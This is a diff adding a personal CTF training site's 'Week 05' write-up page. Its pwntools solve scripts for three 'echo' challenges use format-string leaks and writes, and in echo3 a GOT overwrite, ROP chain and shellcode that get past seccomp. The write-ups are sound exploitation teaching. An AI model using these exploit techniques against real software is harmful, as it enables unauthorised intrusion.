@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>anomie0xff</title>
+    <link rel="stylesheet" href="https://anomie0xff.github.io/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <h3><ul>
+            <li><a href="/">/anomie0xff</a></li>
+            <li><a href="/writeups">/writeups</a></li>
+            <li><a href="/pwn_bootcamp">/pwn_bootcamp</a></li>
+            <li><a href="/pwn_college">/pwn.college</a></li>
+        </ul></h3>
+    </div>
+    <section class="section">
+        <div class="container">
+            
+<h1 class="title">
+  Week 05
+</h1>
+
+<div class="page-content">
+<h1 id="echo1">echo1</h1>
+<p>Just spammed <code>%p</code> and decoded the ASCII looking things.</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>exe = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./echo1_patched</span><span>&quot;)
+</span><span>libc = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;)
+</span><span>ld = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./ld-linux-x86-64.so.2</span><span>&quot;)
+</span><span>
+</span><span>context.binary = exe
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">conn</span><span>():
+</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">LOCAL</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">process</span><span>([exe.path])
+</span><span>        </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">DEBUG</span><span>:
+</span><span>            gdb.</span><span style="color:#bf616a;">attach</span><span>(r)
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">pwn.cybr.club</span><span>&quot;, </span><span style="color:#d08770;">7014</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">return </span><span>r
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    r = </span><span style="color:#bf616a;">conn</span><span>()
+</span><span>    </span><span style="color:#65737e;"># honestly just tried a bunch of format strings until I noticed the hex form of gigem when trying $p a bunch. Then I just printed the next several pointers and manually decoded and reversed the flag in cyberchef
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">%14$p.%15$p.%16$p.%17$p.%18$p.%19$p.</span><span>&#39;)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(r.</span><span style="color:#bf616a;">recv</span><span>())
+</span><span>    
+</span><span style="color:#b48ead;">if </span><span>__name__ == &quot;</span><span style="color:#a3be8c;">__main__</span><span>&quot;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="echo2">echo2</h1>
+<p>To figure out things like the address of main being <code>%19$p</code>, I first ran it in gdb with a breakpoint after the printf call and spammed %p into the input, then checked what each pointer on the stack corresponded to by disassembling/examinig the memory at each pointer.</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>exe = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./echo2_patched</span><span>&quot;)
+</span><span>libc = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;)
+</span><span>ld = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./ld-linux-x86-64.so.2</span><span>&quot;)
+</span><span>
+</span><span>context.binary = exe
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">conn</span><span>():
+</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">LOCAL</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">process</span><span>([exe.path])
+</span><span>        </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">DEBUG</span><span>:
+</span><span>            gdb.</span><span style="color:#bf616a;">attach</span><span>(r)
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">128.199.12.141</span><span>&quot;, </span><span style="color:#d08770;">7014</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">return </span><span>r
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    r = </span><span style="color:#bf616a;">conn</span><span>()
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># good luck pwning :)
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># first leak address of main to be able to get the offest to the global variable
+</span><span>    r.</span><span style="color:#bf616a;">recvline</span><span>()
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">%19$p</span><span>&#39;)
+</span><span>    main_addr = </span><span style="color:#bf616a;">int</span><span>(r.</span><span style="color:#bf616a;">recvline</span><span>(), </span><span style="color:#d08770;">16</span><span>)
+</span><span>    
+</span><span>    </span><span style="color:#65737e;"># pwntools go brr
+</span><span>    authorized_addr = main_addr + </span><span style="color:#d08770;">0x2e8f
+</span><span>    writes = {authorized_addr: </span><span style="color:#d08770;">0x1</span><span>}
+</span><span>    payload = </span><span style="color:#bf616a;">fmtstr_payload</span><span>(</span><span style="color:#d08770;">6</span><span>, writes)
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>
+</span><span>    r.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &quot;</span><span style="color:#a3be8c;">__main__</span><span>&quot;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="echo3">echo3</h1>
+<p>Very fun, try it yourself first if you can, seccomp is a funny thing. I had to try several things while debugging so there are probably unused gadgets lying around in the solve script, I'll go back and clean this up later.</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>exe = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./echo3_patched</span><span>&quot;)
+</span><span>libc = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;)
+</span><span>ld = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./ld-linux-x86-64.so.2</span><span>&quot;)
+</span><span>
+</span><span>context.binary = exe
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">conn</span><span>():
+</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">LOCAL</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">process</span><span>([exe.path])
+</span><span>        gdb.</span><span style="color:#bf616a;">attach</span><span>(r)
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">128.199.12.141</span><span>&quot;, </span><span style="color:#d08770;">7015</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">return </span><span>r
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    r = </span><span style="color:#bf616a;">conn</span><span>()
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># good luck pwning :)
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">%2$p</span><span>&#39;)
+</span><span>    buf_addr = </span><span style="color:#bf616a;">int</span><span>(r.</span><span style="color:#bf616a;">recvline</span><span>(), </span><span style="color:#d08770;">16</span><span>)
+</span><span>
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">%21$p</span><span>&#39;)
+</span><span>    main_addr = </span><span style="color:#bf616a;">int</span><span>(r.</span><span style="color:#bf616a;">recvline</span><span>(), </span><span style="color:#d08770;">16</span><span>)
+</span><span>
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">%17$p</span><span>&#39;)
+</span><span>    libc_base = </span><span style="color:#bf616a;">int</span><span>(r.</span><span style="color:#bf616a;">recvline</span><span>(), </span><span style="color:#d08770;">16</span><span>) - </span><span style="color:#d08770;">235 </span><span>- libc.sym[&#39;</span><span style="color:#a3be8c;">__libc_start_main</span><span>&#39;]
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(buf_addr))
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(main_addr))
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(libc_base))
+</span><span>
+</span><span>    exit_addr = main_addr + </span><span style="color:#d08770;">0x2ea3
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">exit@got.plt:</span><span>&#39;, </span><span style="color:#96b5b4;">hex</span><span>(exit_addr))
+</span><span>
+</span><span>    pop_pop_ret = </span><span style="color:#d08770;">0x23a5c </span><span>+ libc_base
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">pop_pop_ret</span><span>&#39;, </span><span style="color:#96b5b4;">hex</span><span>(pop_pop_ret))
+</span><span>    pop_pop_ret = </span><span style="color:#bf616a;">p64</span><span>(pop_pop_ret)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">8</span><span>, </span><span style="color:#d08770;">2</span><span>):
+</span><span>        writes = {exit_addr+i: pop_pop_ret[i:i+</span><span style="color:#d08770;">2</span><span>]}
+</span><span>        payload = </span><span style="color:#bf616a;">fmtstr_payload</span><span>(</span><span style="color:#d08770;">6</span><span>, writes)        
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#96b5b4;">len</span><span>(payload))
+</span><span>        r.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>    
+</span><span>    r.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>
+</span><span>    syscall = </span><span style="color:#bf616a;">p64</span><span>(libc_base + </span><span style="color:#d08770;">0xb58a5</span><span>)
+</span><span>    write_addr = main_addr + </span><span style="color:#d08770;">0x2e4b
+</span><span>    rdi_ret = </span><span style="color:#bf616a;">p64</span><span>(libc_base + </span><span style="color:#d08770;">0x23a5f</span><span>)
+</span><span>    rsi_ret = </span><span style="color:#bf616a;">p64</span><span>(libc_base + </span><span style="color:#d08770;">0x2440e</span><span>)
+</span><span>    rdx_rsi_ret = </span><span style="color:#bf616a;">p64</span><span>(libc_base + </span><span style="color:#d08770;">0x106179</span><span>)
+</span><span>    rax_ret = </span><span style="color:#bf616a;">p64</span><span>(libc_base + </span><span style="color:#d08770;">0x3a638</span><span>)
+</span><span>    rsp_r14_ret = </span><span style="color:#bf616a;">p64</span><span>(libc_base + </span><span style="color:#d08770;">0xb4d9a</span><span>)
+</span><span>
+</span><span>    shellcode_addr = </span><span style="color:#bf616a;">p64</span><span>(main_addr - </span><span style="color:#d08770;">0x11b5</span><span>)
+</span><span>    shellcode = </span><span style="color:#bf616a;">asm</span><span>(shellcraft.</span><span style="color:#bf616a;">cat</span><span>(&#39;</span><span style="color:#a3be8c;">./flag.txt</span><span>&#39;))
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># funnily have to define payload1 before payload0 since it needs to know the length of what it is reading
+</span><span>    payload1 = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">8 </span><span>+ rax_ret + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">10</span><span>) + rdi_ret + shellcode_addr + rdx_rsi_ret + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">7</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x1000</span><span>) + syscall
+</span><span>    payload1 += rax_ret + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) + rdi_ret + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) + rdx_rsi_ret + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#96b5b4;">len</span><span>(shellcode)) + shellcode_addr + syscall
+</span><span>    payload1 += shellcode_addr
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># rax and rdi are already 0, no need to set them
+</span><span>    payload0 = rdx_rsi_ret + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#96b5b4;">len</span><span>(payload1)) + </span><span style="color:#bf616a;">p64</span><span>(write_addr) + syscall + rsp_r14_ret + </span><span style="color:#bf616a;">p64</span><span>(write_addr)
+</span><span>
+</span><span>    
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">n</span><span>&#39; + </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\x00</span><span>&#39;*</span><span style="color:#d08770;">7 </span><span>+ payload0 + </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">B</span><span>&#39;*(</span><span style="color:#d08770;">63</span><span>-</span><span style="color:#d08770;">9</span><span>-</span><span style="color:#96b5b4;">len</span><span>(payload0)))
+</span><span>    r.</span><span style="color:#bf616a;">send</span><span>(payload1)
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(shellcode)
+</span><span>    r.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &quot;</span><span style="color:#a3be8c;">__main__</span><span>&quot;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span><span>
+</span></code></pre>
+
+</div>
+
+        </div>
+    </section>
+</body>
+
+</html>
